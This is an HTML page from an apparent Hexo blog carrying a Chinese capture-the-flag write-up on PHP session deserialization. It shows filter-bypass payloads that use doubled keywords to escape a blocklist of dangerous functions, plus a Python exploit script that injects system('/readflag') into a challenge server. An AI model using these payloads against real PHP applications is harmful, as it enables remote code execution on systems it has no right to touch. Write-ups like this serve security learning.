@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="platform看了一眼class.php 考点应该是session反序列化 php 123456789private $sensitiveFunctions &#x3D; [&#x27;system&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;passthru&#x27;, &#x27;shell_exec&#x27;, &#x27;popen&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2024/11/18/platform/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="platform看了一眼class.php 考点应该是session反序列化 php 123456789private $sensitiveFunctions &#x3D; [&#x27;system&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;passthru&#x27;, &#x27;shell_exec&#x27;, &#x27;popen&amp;#x2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:\myblog\source_posts\%E5%9B%BE%E7%89%87\image-20241103163347648.png">
+<meta property="og:image" content="d:\myblog\source_posts\%E5%9B%BE%E7%89%87\image-20241103163738734.png">
+<meta property="og:image" content="d:\myblog\source_posts\%E5%9B%BE%E7%89%87\image-20241103164639960.png">
+<meta property="article:published_time" content="2024-11-18T10:56:17.248Z">
+<meta property="article:modified_time" content="2024-11-20T07:37:32.255Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:\myblog\source_posts\%E5%9B%BE%E7%89%87\image-20241103163347648.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-platform" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/11/18/platform/" class="article-date">
+  <time class="dt-published" datetime="2024-11-18T10:56:17.248Z" itemprop="datePublished">2024-11-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h1><p>看了一眼class.php 考点应该是session反序列化</p>
+<p><em>php</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private $sensitiveFunctions = [&#x27;system&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;passthru&#x27;, &#x27;shell_exec&#x27;, &#x27;popen&#x27;, &#x27;proc_open&#x27;];</span><br><span class="line">$sessionData = file_get_contents($sessionFile);</span><br><span class="line"></span><br><span class="line">foreach ($this-&gt;sensitiveFunctions as $function) &#123;</span><br><span class="line">    if (strpos($sessionData, $function) !== false) &#123;</span><br><span class="line">        $sessionData = str_replace($function, &#x27;&#x27;, $sessionData);   //可以双写绕过</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($sessionFile, $sessionData);</span><br></pre></td></tr></table></figure>
+
+<p>利用过滤进行逃逸控制反序列化内容。字符串逃逸了。</p>
+<p>举个栗子：</p>
+<p><em>plaintext</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=passthrupassthrupassthrupassthrupassthrupassthrupassthru</span><br><span class="line">password=O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果我这样写，那么到sess里的数据会长这样：</p>
+<p><em>plaintext</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user|s:56:&quot;passthrupassthrupassthrupassthrupassthrupassthrupassthru&quot;;session_key|s:25:&quot;uz6IWN70l641vlzLjeixuI8CT&quot;;password|s:56:&quot;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>经过处理之后，就变成了</p>
+<p><em>plaintext</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user|s:56:&quot;&quot;;session_key|s:25:&quot;uz6IWN70l641vlzLjeixuI8CT&quot;;password|s:56:&quot;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://infernity.top/img/qwb2024/image-20241103163347648.png"><img src="D:\myblog\source_posts\图片\image-20241103163347648.png" alt="image-20241103163347648"></a></p>
+<p>如果我能让蓝色部分全部被算在user里，后面剩下的部分我就可控，可以反序列化，只需要在payload前面加;xx|</p>
+<p><code>;</code>是分隔前面的数据，xx是键名随便，<code>|</code>是必要格式。</p>
+<p>现在我的数据就变成了：</p>
+<p><a target="_blank" rel="noopener" href="https://infernity.top/img/qwb2024/image-20241103163738734.png"><img src="D:\myblog\source_posts\图片\image-20241103163738734.png" alt="image-20241103163738734"></a></p>
+<p>session_key是随机的，我只需要多发几次包让key的长度与其他脏数据加起来等于56即可。</p>
+<p><em>python</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://eci-2zeikei7c3gbjdb3tab6.cloudeci1.ichunqiu.com&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;username&quot;:&quot;passthrupassthrupassthrupassthrupassthrupassthrupassthru&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;;xx|O:15:\&quot;notouchitsclass\&quot;:1:&#123;s:4:\&quot;data\&quot;;s:20:\&quot;syssystemtem(&#x27;/readflag&#x27;);\&quot;;&#125;&quot;</span><br><span class="line">&#125;         #注意双写</span><br><span class="line">cookies = &#123;&quot;PHPSESSID&quot;:&quot;aaa&quot;&#125;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    res = requests.post(url+&quot;/index.php&quot;,data=data,cookies=cookies)</span><br><span class="line">    if &quot;flag&quot; in res.text:</span><br><span class="line">        print(res.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://infernity.top/img/qwb2024/image-20241103164639960.png"><img src="D:\myblog\source_posts\图片\image-20241103164639960.png" alt="image-20241103164639960"></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/11/18/platform/" data-id="cm49k7n380009r4s7b3047joz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/11/18/phpsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/11/18/%E5%B8%A6%E4%BD%A0%E8%B5%B0%E8%BF%9BPHP%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/12/04/%E7%BD%91%E9%BC%8E%E6%9D%AF-fillll-put/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/18/phpsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/18/platform/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/18/%E5%B8%A6%E4%BD%A0%E8%B5%B0%E8%BF%9BPHP%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/12/%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E5%A4%A7%E5%85%A8/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
